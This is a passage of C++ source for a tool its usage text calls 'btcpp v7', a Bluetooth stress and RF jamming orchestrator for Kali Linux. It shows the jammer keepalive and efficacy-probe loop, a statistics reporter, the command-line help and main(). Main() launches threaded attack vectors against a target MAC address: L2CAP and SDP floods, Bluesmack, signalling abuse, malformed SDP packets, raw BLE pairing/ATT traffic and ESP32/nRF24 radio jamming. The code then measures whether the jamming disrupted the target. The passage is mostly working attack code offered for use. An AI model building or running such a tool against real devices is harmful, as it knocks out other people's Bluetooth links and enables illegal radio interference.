        std::this_thread::sleep_for(std::chrono::milliseconds(500));

        // Periodic keepalive + hardware re-check every 5s
        if (now_ms() - keep_last >= 5000) {
            keep_last = now_ms();
            if (::write(fd, "S", 1) == 1) {
                RfAck st;
                if (rf_expect_ack(fd, 'S', st, 1500) && st.valid && !st.is_err) {
                    record(11, true, 1);
                    g_rf_level = (st.radio_a && st.radio_b)
                                 ? RfLevel::RADIO_DETECTED
                                 : RfLevel::FIRMWARE_RESPONSIVE;
                    if (g_verbose) printf("[rf] %s\n", st.raw.c_str());
                } else {
                    record(11, false);
                    g_rf_level = RfLevel::SERIAL_CONNECTED;
                    printf("[-] RF: keepalive lost — firmware unresponsive\n");
                }
            } else {
                record(11, false);
            }
        }

        // Efficacy probe: one test connection per 2s while jamming
        if (g_efficacy && (now_ms() % 2000) < 500) {
            probe_once();
            uint64_t t = g_probe_try.load() - base_try;
            uint64_t f = g_probe_fail.load() - base_fail;
            if (t >= 5 && g_rf_level >= RfLevel::RADIO_DETECTED) {
                double base_pct = base_try ? 100.0 * base_fail / base_try : 0.0;
                double cur_pct  = 100.0 * f / t;
                if (cur_pct > base_pct + 40.0) {           // significant rise
                    g_rf_level = RfLevel::RF_EFFECT_VERIFIED;
                    printf("[+] RF: %s — probe failures %.0f%% -> %.0f%%\n",
                           rf_level_name(g_rf_level.load()), base_pct, cur_pct);
                }
            }
        }
    }

    ::close(fd);
    printf("[*] RF stopped at level: %s\n", rf_level_name(g_rf_level.load()));
}

// =====================================================================
// Reporter
// =====================================================================

static void reporter(uint64_t start_ms) {
    uint64_t last_ok = 0, last_t = start_ms;
    while (g_run) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        uint64_t t = now_ms();
        uint64_t ok = 0, er = 0, by = 0;
        for (int i = 0; i < kVecCount; i++) {
            ok += g_ok[i].load(); er += g_err[i].load(); by += g_bytes[i].load();
        }
        double elap = (t - start_ms) / 1000.0;
        double rate = (t > last_t) ? (double)(ok - last_ok) / ((t - last_t) / 1000.0) : 0;
        double eff  = efficacy_current();
        if (g_json) {
            printf("{\"t\":%.1f,\"ok\":%llu,\"err\":%llu,\"ops_s\":%.0f,\"kbps\":%.1f,"
                   "\"delay_us\":%d,\"rf_level\":\"%s\",\"probe_fail_pct\":%.0f,\"per_vec\":[",
                   elap, (unsigned long long)ok, (unsigned long long)er,
                   rate, (by / 1024.0) / (elap + 1e-6), g_delay_us.load(),
                   rf_level_name(g_rf_level.load()), eff);
            for (int i = 0; i < kVecCount; i++) {
                printf("%s{\"v\":\"%s\",\"ok\":%llu,\"err\":%llu}",
                       i ? "," : "", vec_name[i],
                       (unsigned long long)g_ok[i].load(),
                       (unsigned long long)g_err[i].load());
            }
            printf("]}\n");
        } else {
            printf("[stats] t=%5.1fs ok=%-9llu err=%-9llu %.0f ops/s %.1f KB/s "
                   "delay=%dus rf=%s probe_fail=%.0f%%\n",
                   elap, (unsigned long long)ok, (unsigned long long)er,
                   rate, (by / 1024.0) / (elap + 1e-6), g_delay_us.load(),
                   rf_level_name(g_rf_level.load()), eff);
            if (g_verbose) {
                for (int i = 0; i < kVecCount; i++) {
                    uint64_t o = g_ok[i].load(), e = g_err[i].load();
                    if (o || e) printf("    %-15s ok=%-9llu err=%-9llu\n",
                                       vec_name[i], (unsigned long long)o,
                                       (unsigned long long)e);
                }
            }
        }
        fflush(stdout);
        last_ok = ok; last_t = t;
    }
}

// =====================================================================
// CLI
// =====================================================================

static void usage(const char* prog) {
    printf("=== btcpp v7 — Bluetooth stress + RF jamming orchestrator (Linux/Kali) ===\n\n");
    printf("Usage: %s -t <MAC> [options]\n\n", prog);
    printf("Required:\n");
    printf("  -t <MAC>        Target Bluetooth MAC\n\n");
    printf("Protocol vectors (via BlueZ/HCI):\n");
    printf("  -i <iface>      HCI interface (default: hci0)\n");
    printf("  -T <threads>    Threads 1-14 (default: 8)\n");
    printf("  -R <pub|rand>   BLE address type (default: pub)\n");
    printf("  -A              Tune adapter (page/inq scan)\n\n");
    printf("RF jamming (requires ESP32+nRF24 hardware with ACK-protocol firmware):\n");
    printf("  -p <dev>        Serial port of ESP32 (e.g. /dev/ttyUSB0)\n");
    printf("  -M <mode>       RF mode: T=BT Classic, B=BLE, A=All (default: A)\n");
    printf("  -E              Efficacy probe: independently measure jamming effect\n\n");
    printf("General:\n");
    printf("  -d <seconds>    Duration (default: 30)\n");
    printf("  -V <mask>       Vector mask (default: 4095 = all):\n");
    printf("                   1=L2CAP       2=HCI conn     4=RFCOMM      8=SCO\n");
    printf("                  16=BLE raw    32=SDP flood   64=L2 echo\n");
    printf("                 128=Bluesmack 256=Sig abuse  512=SDP malformed\n");
    printf("                1024=BLE SM+ATT raw  2048=RF jam (needs -p)\n");
    printf("  -j              JSON stats (1 line per second)\n");
    printf("  -s              Scan and exit\n");
    printf("  -v              Verbose (per-vector stats + RF responses)\n");
    printf("  -h              Help\n\n");
    printf("Examples:\n");
    printf("  sudo %s -s\n", prog);
    printf("  sudo %s -t AA:BB:CC:DD:EE:FF -d 60 -T 10 -v\n", prog);
    printf("  sudo %s -t AA:BB:CC:DD:EE:FF -V 384              # Bluesmack + sig abuse only\n", prog);
    printf("  sudo %s -t AA:BB:CC:DD:EE:FF -p /dev/ttyUSB0 -M A -E -d 120\n", prog);
}

int main(int argc, char** argv) {
    std::string mac, bletype = "pub";
    std::string iface = "hci0";
    int seconds = 30, threads = 8, mask = 4095;

    int opt;
    while ((opt = getopt(argc, argv, "t:i:d:T:V:R:p:M:EAjsvh")) != -1) {
        switch (opt) {
            case 't': mac = optarg; break;
            case 'i': iface = optarg; break;
            case 'd': seconds = atoi(optarg); break;
            case 'T': threads = std::min(14, std::max(1, atoi(optarg))); break;
            case 'V': mask = atoi(optarg); break;
            case 'R': bletype = optarg; break;
            case 'p': g_serial = optarg; break;
            case 'M': g_rfmode = optarg; break;
            case 'E': g_efficacy = true; break;
            case 'A': g_tune = true; break;
            case 'j': g_json = true; break;
            case 'v': g_verbose = true; break;
            case 'h': usage(argv[0]); return 0;
            default:  usage(argv[0]); return 1;
        }
    }

    if ((mask & 2048) && g_serial.empty()) {
        fprintf(stderr, "[-] RF vector (mask 2048) requires -p <serial_port>\n");
        fprintf(stderr, "    e.g. -p /dev/ttyUSB0  (check: ls /dev/ttyUSB* /dev/ttyACM*)\n");
        return 1;
    }
    bool rf_only = (mask == 2048);

    g_dev = hci_devid(iface.c_str());
    if (g_dev < 0 && !rf_only) {
        fprintf(stderr, "[-] No Bluetooth adapter found ('%s').\n", iface.c_str());
        fprintf(stderr, "    Fixes:\n");
        fprintf(stderr, "      1. Plug a USB Bluetooth dongle\n");
        fprintf(stderr, "      2. Run: sudo hciconfig hci0 up\n");
        fprintf(stderr, "      3. Check: hciconfig -a\n");
        fprintf(stderr, "      4. In a VM: pass the USB device to the VM\n");
        return 2;
    }

    signal(SIGINT, on_sigint);

    bool scan_only = false;
    for (int i = 1; i < argc; i++)
        if (std::string(argv[i]) == "-s") { scan_only = true; break; }
    if (scan_only) {
        if (g_dev < 0) { fprintf(stderr, "[-] scan needs a Bluetooth adapter\n"); return 2; }
        do_scan(g_dev);
        return 0;
    }

    if (mac.empty()) { usage(argv[0]); return 1; }
    if (str2ba(mac.c_str(), &g_dst) < 0) {
        fprintf(stderr, "[-] bad MAC: %s\n", mac.c_str());
        return 1;
    }
    g_dst_type = (bletype == "rand") ? BDADDR_LE_RANDOM : BDADDR_LE_PUBLIC;

    printf("=== btcpp v7 ===\n");
    printf("[*] target=%s iface=%s dur=%ds threads=%d mask=0x%X ble=%s tune=%d json=%d efficacy=%d\n",
           mac.c_str(), iface.c_str(), seconds, threads, mask,
           bletype.c_str(), (int)g_tune, (int)g_json, (int)g_efficacy);
    if (!g_serial.empty())
        printf("[*] RF jammer: %s (mode %s)\n", g_serial.c_str(), g_rfmode.c_str());
    printf("[*] Ctrl+C to stop\n\n");

    tune_adapter(g_dev);

    // Efficacy baseline BEFORE any jamming starts
    if (g_efficacy && g_dev >= 0)
        efficacy_baseline(seconds);

    auto pick = [&](int slot) {
        std::vector<int> sel;
        if (mask & 1)    sel.push_back(0);
        if (mask & 2)    sel.push_back(1);
        if (mask & 4)    sel.push_back(2);
        if (mask & 8)    sel.push_back(3);
        if (mask & 16)   sel.push_back(4);
        if (mask & 32)   sel.push_back(5);
        if (mask & 64)   sel.push_back(6);
        if (mask & 128)  sel.push_back(7);
        if (mask & 256)  sel.push_back(8);
        if (mask & 512)  sel.push_back(9);
        if (mask & 1024) sel.push_back(10);
        if (mask & 2048) sel.push_back(11);
        if (sel.empty()) sel.push_back(0);
        return sel[slot % sel.size()];
    };

    uint64_t start = now_ms();
    std::thread rep(reporter, start);
    std::thread pacer(pacer_loop);
    std::vector<std::thread> pool;
    for (int i = 0; i < threads; ++i) {
        int v = pick(i);
        pool.emplace_back([v]() {
            switch (v) {
                case 0:  vec_l2cap();          break;
                case 1:  vec_hci_conn();       break;
                case 2:  vec_rfcomm();         break;
                case 3:  vec_sco();            break;
                case 4:  vec_ble_att_raw();    break;
                case 5:  vec_sdp_flood();      break;
                case 6:  vec_l2cap_echo();     break;
                case 7:  vec_bluesmack();      break;
                case 8:  vec_l2cap_sigabuse(); break;
                case 9:  vec_sdp_malformed();  break;
                case 10: vec_ble_sm_att_raw(); break;
                case 11: vec_rf_serial();      break;
            }
        });
    }
    while (g_run && (now_ms() - start) < (uint64_t)seconds * 1000)
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    g_run = false;
    for (auto& t : pool) t.join();
    pacer.join();
    rep.join();

    restore_adapter(g_dev);

    printf("\n=== done in %.1fs — per-vector ===\n", (now_ms() - start) / 1000.0);
    for (int i = 0; i < kVecCount; i++) {
        uint64_t o = g_ok[i].load(), e = g_err[i].load(), b = g_bytes[i].load();
        if (o || e) printf("  %-15s ok=%-9llu err=%-9llu %llu KB\n",
                           vec_name[i], (unsigned long long)o,
                           (unsigned long long)e, (unsigned long long)(b / 1024));
    }

    // Final efficacy verdict
    if (g_efficacy) {
        uint64_t t = g_probe_try.load(), f = g_probe_fail.load();
        printf("\n=== efficacy probe ===\n");
        printf("  probes: %llu attempts, %llu failures (%.0f%%)\n",
               (unsigned long long)t, (unsigned long long)f,
               t ? 100.0 * f / t : 0.0);
        printf("  RF final level: %s\n", rf_level_name(g_rf_level.load()));
        printf("  Note: RF_EFFECT_VERIFIED requires an independent failure-rate rise\n");
        printf("        over baseline. RADIO_DETECTED alone is NOT proof of RF effect.\n");
    }
    return 0;
}
